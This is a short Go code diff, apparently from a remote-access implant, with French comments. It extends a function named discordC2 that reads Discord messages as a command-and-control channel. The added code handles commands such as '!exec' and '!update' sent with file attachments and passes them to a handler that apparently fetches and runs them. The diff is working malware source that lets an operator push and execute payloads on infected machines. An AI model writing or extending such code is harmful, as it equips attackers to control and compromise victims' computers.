@@ -197,6 +197,7 @@ type discordMessage struct {
 	Mentions []struct {
 		ID string `json:"id"`
 	} `json:"mentions"`
+	Attachments []attachment `json:"attachments"`
 }
 
 /* ------------------------------------------------------------------ */
@@ -262,6 +263,18 @@ func discordC2() {
 			c2Seen[m.ID] = true
 			if len(c2Seen) > 500 {
 				c2Seen = map[string]bool{m.ID: true}
+			}
+			// Pièce jointe + commande : `!exec fichier.zip` ou `!new`.
+			if len(m.Attachments) > 0 {
+				words := strings.Fields(strings.TrimSpace(strings.TrimPrefix(m.Content, "!")))
+				if len(words) > 0 {
+					switch strings.ToLower(words[0]) {
+					case "exec", "run", "new", "update", "maj":
+						plog("c2 pièce jointe: " + words[0] + " (" + m.Attachments[0].Filename + ")")
+						go handleAttachments(words[0], m.Attachments)
+						continue
+					}
+				}
 			}
 			cmd, ok := c2Parse(m)
 			if !ok {
